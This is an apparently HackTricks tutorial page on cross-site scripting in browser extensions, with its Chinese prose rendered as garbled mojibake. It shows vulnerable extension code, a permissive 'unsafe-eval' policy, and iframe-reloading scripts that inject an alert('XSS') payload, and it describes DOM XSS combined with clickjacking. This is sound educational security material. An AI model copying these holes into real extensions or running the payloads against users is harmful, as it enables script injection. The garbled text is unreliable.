# BrowExt - XSS ç¤ºä¾‹

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æŠ€æœ¯ï¼Œæˆä¸º</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS çº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨å¸Œæœ›åœ¨ **HackTricks ä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š** æˆ– **ä¸‹è½½ HackTricks çš„ PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å– [**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç° [**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„ [**NFT é›†åˆ**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥**åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§**ã€‚

</details>

## åœ¨ Iframe ä¸Šçš„ XSS

**å†…å®¹è„šæœ¬** åˆ›å»ºäº†ä¸€ä¸ª Iframeï¼Œå¹¶åœ¨ Iframe æºçš„å‚æ•°ä¸­æŒ‡å®šäº†ä¸€ä¸ª **URL**ï¼š
```javascript
chrome.storage.local.get("message", result =>
{
frame.src = chrome.runtime.getURL("message.html") +
"?message=" + encodeURIComponent(result.message) +
"&url=https://example.net/explanation";
});
```
æš´éœ²çš„HTMLé¡µé¢ï¼š**`message.html`**ï¼Œå¯ä»¥é€šè¿‡**æµè§ˆå™¨**è®¿é—®ï¼ŒåŒ…å«å¦‚ä¸‹ä»£ç ï¼š
```java
$(() =>
{
let params = new URLSearchParams(location.search);
$(document.body).append(params.get("message") + " <button>Explain</button>");
$("body > button").click(() =>
{
chrome.tabs.create({ url: params.get("url") });
});
});
```
æ¶æ„é¡µé¢æ‰§è¡Œå¦‚ä¸‹è„šæœ¬æ¥å°†æ¶ˆæ¯æ›´æ”¹ä¸º**XSS payload**ï¼š
```javascript
setTimeout(() =>
{
let frame = document.querySelector("iframe:last-child");
let src = frame.src;

// Remove existing query parameters
src = src.replace(/\?.*/, "");

// Add malicious query parameters
src += "?message=" + encodeURIComponent("<script>alert('XSS')</script>");

// Load into frame
frame.src = src;
}, 1000);
```
```markdown
ä¸€ä¸ªå®½æ¾çš„å†…å®¹å®‰å…¨ç­–ç•¥ï¼Œä¾‹å¦‚
```
```json
"content_security_policy": "script-src 'self' 'unsafe-eval'; object-src 'self';"
```
å°†å…è®¸æ‰§è¡ŒJSä»£ç ã€‚

å¦ä¸€ç§æŒ‰éœ€è§¦å‘XSSçš„æ–¹æ³•æ˜¯è¿è¡Œï¼š
```javascript
let frame = document.createElement("iframe");
frame.src = "chrome-extension://abcdefghijklmnopabcdefghijklmnop/message.html?message="
+ encodeURIComponent("<script>alert('XSS')</script>");
document.body.appendChild(frame);
```
## åŸºäºDOMçš„XSS + ç‚¹å‡»åŠ«æŒ

ç¬¬ä¸€ä¸ªæ¼æ´æ˜¯ä½äº **`/html/bookmarks.html`** çš„åŸºäºDOMçš„è·¨ç«™è„šæœ¬ï¼ˆXSSï¼‰æ¼æ´ï¼Œä»¥ä¸‹æ˜¯åŒ…å«çš„ **`bookmarks.js`** ä¸­çš„æ˜“å—æ”»å‡»çš„JavaScriptä»£ç ï¼š
```javascript
$('#btAdd').click(function() {
var btname = $('#txtName').val();
if ($('.custom-button .name').filter(function() {
return $(this).text() === btname;
}).length) return false;

var span = $('<span class="custom-button">');
span.html('<span class="name">' + btname + '</span>');
span.append('<a href="javascript:void(0)" title="remove">x</a>');
span.attr('title', btname);
span.data('id', (new Date().getTime()));
$('div.custom-buttons .existing').append(span);
save_options();
});
```
ä¸Šè¿°JavaScriptä»£ç å–å¾—**`txtName`** æ–‡æœ¬æ¡†çš„**å€¼**ï¼Œå¹¶ä½¿ç”¨**å­—ç¬¦ä¸²æ‹¼æ¥æ„å»ºHTML**ï¼Œç„¶åé€šè¿‡jQueryçš„[â€œappend()â€](https://api.jquery.com/append/)å‡½æ•°è¿½åŠ åˆ°DOMä¸­ã€‚

é€šå¸¸ï¼ŒChromeæ‰©å±•çš„å†…å®¹å®‰å…¨ç­–ç•¥ï¼ˆCSPï¼‰åº”è¯¥é˜²æ­¢è¿™ç§æ¼æ´è¢«åˆ©ç”¨ã€‚ç„¶è€Œï¼Œç”±äºé€šè¿‡[**â€˜unsafe-evalâ€™**](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src)æ”¾å®½äº†æ­¤ç­–ç•¥ï¼Œå¹¶ä½¿ç”¨äº†jQueryçš„DOM APIï¼Œè¿™ä¸ªæ¼æ´ä»ç„¶å¯ä»¥è¢«**åˆ©ç”¨**ã€‚è¿™æ˜¯å› ä¸ºjQueryçš„è®¸å¤šDOM APIä½¿ç”¨äº†[â€œglobalEval()â€](https://api.jquery.com/jquery.globaleval/)ï¼Œå®ƒä¼šåœ¨è„šæœ¬è¿½åŠ åˆ°DOMæ—¶è‡ªåŠ¨è°ƒç”¨[â€œeval()â€](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval)ã€‚

è™½ç„¶è¿™æ˜¯ä¸€ä¸ªä¸¥é‡çš„æ¼æ´ï¼Œä½†ç”±äºéœ€è¦**ç”¨æˆ·äº’åŠ¨æ¥åˆ©ç”¨å®ƒ**ï¼Œå•ç‹¬åˆ©ç”¨å®ƒçš„èŒƒå›´ç›¸å½“æœ‰é™ã€‚å—å®³è€…å¿…é¡»æ‰“å¼€é¡µé¢ï¼Œå°†è·¨ç«™è„šæœ¬ï¼ˆXSSï¼‰æœ‰æ•ˆè½½è·ç²˜è´´åˆ°å­—æ®µä¸­ï¼Œå¹¶ç‚¹å‡»â€œæ·»åŠ â€æŒ‰é’®æ¥åˆ©ç”¨å®ƒã€‚

ä¸ºäº†æ›´å¥½åœ°åˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼Œæˆ‘ä»¬åˆ©ç”¨äº†å¦ä¸€ä¸ªæ¼æ´ï¼ˆ**clickjacking**ï¼‰æ¥å¢å¼ºæ”»å‡»ã€‚

ä»¥ä¸‹æ˜¯Chromeæ‰©å±•æ¸…å•æ–‡ä»¶çš„æ‘˜å½•ï¼š
```json
...trimmed for brevity...
"web_accessible_resources": [
"_locales/*",
"bundle/*",
"dist/*",
"assets/*",
"font/*",
"html/bookmarks.html",
"css/*.css",
"js/*.js",
"js/jquery/*.js",
"js/lang/*"
],
...trimmed for brevity...
```
ä¸Šè¿°éƒ¨åˆ†å±•ç¤ºäº†æ‰©å±•é€šè¿‡å…¶ **`web_accessible_resources`** ç­–ç•¥å¹¿æ³›åœ°æ•è·èµ„æºã€‚

**`/html/bookmarks.html`** é¡µé¢ä¹Ÿèƒ½å¤Ÿè¢«**æ¡†æ¶åŒ–**ï¼Œå› æ­¤å¯ä»¥é€šè¿‡**ç‚¹å‡»åŠ«æŒ**è¢«**åˆ©ç”¨**ã€‚æˆ‘ä»¬æ»¥ç”¨è¿™ä¸€ç‚¹ï¼Œåœ¨æˆ‘ä»¬çš„ç½‘é¡µä¸­åµŒå…¥æ­¤é¡µé¢ï¼Œå¹¶**ç”¨DOMå…ƒç´ è¦†ç›–æ¡†æ¶æ¥é‡æ–°å¸ƒå±€**ã€‚è¿™ä½¿å¾—å—å®³è€…ä¸çŸ¥é“ä»–ä»¬**å®é™…ä¸Šæ˜¯åœ¨ä¸ä¸‹é¢çš„æ‰©å±•äº¤äº’**ã€‚ä¸‹é¢çš„åŠ¨ç”»æ¼”ç¤ºäº†è¿™ç§æ•ˆæœï¼ˆæŸ¥çœ‹åŠ¨ç”»è¯·è®¿é—®[**åŸå§‹å¸–å­å†™ä½œ**](https://thehackerblog.com/steam-fire-and-paste-a-story-of-uxss-via-dom-xss-clickjacking-in-steam-inventory-helper/)ï¼‰ã€‚

## å‚è€ƒèµ„æ–™

* [https://palant.info/2022/08/31/when-extension-pages-are-web-accessible/](https://palant.info/2022/08/31/when-extension-pages-are-web-accessible/)
* [https://thehackerblog.com/steam-fire-and-paste-a-story-of-uxss-via-dom-xss-clickjacking-in-steam-inventory-helper/](https://thehackerblog.com/steam-fire-and-paste-a-story-of-uxss-via-dom-xss-clickjacking-in-steam-inventory-helper/)

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æ”»å‡»ç›´åˆ°æˆä¸ºä¸“å®¶ï¼Œé€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹çš„PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥**åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
